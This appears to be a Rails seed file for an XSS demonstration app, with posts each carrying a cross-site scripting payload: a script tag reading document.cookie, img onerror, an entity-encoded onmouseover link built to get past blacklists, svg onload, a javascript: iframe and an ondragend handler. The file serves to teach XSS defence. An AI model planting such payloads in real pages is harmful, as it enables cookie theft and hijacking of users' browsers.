

# This file should contain all the record creation needed to seed the database with its default values.
# The data can then be loaded with the rails db:seed command (or created alongside the database with db:setup).


posts = Post.create([
  {
    title: 'Simple Text',
    description: '',
    code: '',
    body: "This is just a normal first post without any XSS stuff inside. It's sort of what you would expect from your usual text input."
  },
  {
    title: 'Expected Tags',
    description: '',
    code: '',
    body: "This is a post with some <b><i>awesome</i><b> tags. It's what you would maybe want to <strong>work</strong> in a <u>post</u>."
  },
  {
    title: 'Script Injection',
    description: '',
    code: '',
    body: "This is a post with a script Tag. It's what you'd want to avoid to happen. But instead you get some unwanted <strong>alerts</strong>. <script>alert(document.cookie)</script>"
  },
  {
    title: 'Evil Image',
    description: 'Maybe you want to add an image to some posts? Great idea! This is how it can go wrong by using onerror while purposely causing that error:',
    code: "<img src=x onerror=alert('XSS!') >",
    body: "<img src=x onerror=alert('XSS!') >"
  },
  {
    title: 'Encoded Script',
    description: 'So you put script tags on a blacklist? This is how this could be worked around quite easily by using an encoded script tag:',
    code: '<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">Hover PLS!</a',
    body: '<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">Hover PLS!</a <br> <br> <br>'
  },
  {
    title: 'Fancy SVG',
    description: 'Refresh to see how broken SVG tags could ruin your day by using a modified svg tag...',
    code: "<svg/onload=alert('Haha!')",
    body: "<textarea readonly><svg/onload=alert('Haha!')</textarea> <svg/onload=alert('Haha!')"
  },
  {
    title: 'Evil Iframe',
    description: 'Classic example for evil iframes:',
    code: "<iframe SRC=\"javascript:alert('XSS');\" ></iframe>",
    body: "<code><iframe SRC=\"javascript:alert('XSS');\" ></iframe></code> <iframe SRC=\"javascript:alert('XSS');\" ></iframe>"
  },
  {
    title: 'Drag this',
    description: 'This will cause an alert on drag by using the ondragend attribute.',
    code: '<xss draggable="true" ondragend="alert(1)">test</xss>',
    body: '<xss draggable="true" ondragend="alert(1)">test</xss>'
  },
  {
    title: 'Ajax to the max',
    description: 'This button loads a script we created locally, but could also come from an external source. It will be executed via: onclick="loadPostIndex();.',
    code: "function loadPostIndex() {
      $.ajax({
        url: 'http://localhost:3000/ajax_index',
        dataType: 'html',
        success: function(data){
        console.log(data);
        if(data){
          $('#index').html(data);
        }
      }});
    }",
    body: '<button onclick="loadPostIndex();">Load Stuff</button>'
  }
])